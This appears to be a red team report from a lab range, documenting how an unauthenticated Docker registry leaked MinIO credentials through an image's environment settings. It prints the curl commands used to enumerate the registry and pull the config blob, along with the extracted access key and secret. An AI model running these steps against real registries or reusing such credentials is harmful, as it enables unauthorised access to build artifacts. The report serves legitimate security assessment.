# Red Team Engagement Report — M2 · dev-registry
**Report ID:** RED-REPORT-DEV01-M02 | **Operator:** Rudra-7
**Range:** RNG-DEV-01 · VIKAS TANTRA · OPERATION GRIDFALL

---
## Executive Summary
| Item | Value |
|---|---|
| Target | PUL Container Registry · 11.x.x.x:5000 |
| Vulnerability | Unauthenticated Registry v2 API + credentials in image ENV blob |
| MITRE | T1552.001 · T1613 |
| Outcome | **SUCCESS** — MinIO credentials extracted |
| Pivot | M3 dev-artifacts (11.x.x.x:9000) |

---
## Exploitation
```bash
# 1. Enumerate (unauthenticated)
curl -s http://11.x.x.x:5000/v2/_catalog
# {"repositories":["pul/firmware-builder","pul/sonar-runner"]}

# 2. Get manifest
curl -s http://11.x.x.x:5000/v2/pul/firmware-builder/manifests/latest | jq .config.digest
# "sha256:a4f3c2b1..."

# 3. Download config blob — credentials in Env
curl -s http://11.x.x.x:5000/v2/pul/firmware-builder/blobs/sha256:a4f3c2b1... | jq .config.Env
```

## Artifacts
- `MINIO_ACCESS_KEY=pul-build-svc`
- `MINIO_SECRET_KEY=Artf@ct5tr!PUL24`
- `ARTIFACT_STORE_HOST=11.x.x.x:9000`

## Operator Notes
The `note` label in the image config explicitly mentions the Vault migration TODO (DEVOPS-2847). This is a systemic pattern at PUL — technical debt deferred under delivery pressure repeatedly produces credential exposure. The image hasn't been rebuilt since November 2024.
